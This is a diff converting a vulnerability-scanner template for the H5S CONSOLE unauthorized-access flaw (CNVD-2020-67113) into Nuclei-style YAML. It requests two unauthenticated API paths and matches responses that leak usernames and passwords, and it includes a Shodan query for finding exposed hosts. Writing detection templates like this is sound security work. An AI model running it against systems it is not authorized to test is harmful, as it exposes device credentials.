@@ -1,20 +1,44 @@
 id: CNVD-2020-67113
 
 info:
-    name: H5S CONSOLE 存在未授权访问
-    author: iak3ec(https://github.com/nu0l)
-    severity: high
+  name: H5S CONSOLE Unauthorized Access Vulnerability (CNVD-2020-67113)
+  author: ritikchaddha
+  severity: high
+  description: Zero Vision Technology (Shanghai) Co., Ltd. H5S CONSOLE Exists Unauthorized Access Vulnerability
+  reference:
+    - https://vul.wangan.com/a/CNVD-2020-67113
+  metadata:
+    shodan-query: http.title:"H5S CONSOLE"
+  tags: h5s,unauth,h5sconsole,cnvd,cnvd2020
 
-rules:
-  h5s1:
-    request:
-      method: GET
-      path: /api/v1/GetSrc
-    expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"H5_AUTO") && response.body.bcontains(b"strUser") && response.body.bcontains(b"strPasswd")
-  h5s2:
-    request:
-      method: GET
-      path: /api/v1/GetDevice
-    expression: response.status == 200 && response.content_type.contains("json") && response.body.bcontains(b"H5_DEV") && response.body.bcontains(b"strUser") && response.body.bcontains(b"strPasswd")
-expression: h5s1() || h5s2()
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/v1/GetSrc"
+      - "{{BaseURL}}/api/v1/GetDevice"
 
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'strUser'
+          - 'strPasswd'
+        condition: and
+
+      - type: word
+        part: body
+        words:
+          - 'H5_AUTO'
+          - 'H5_DEV'
+        condition: or
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: status
+        status:
+          - 200
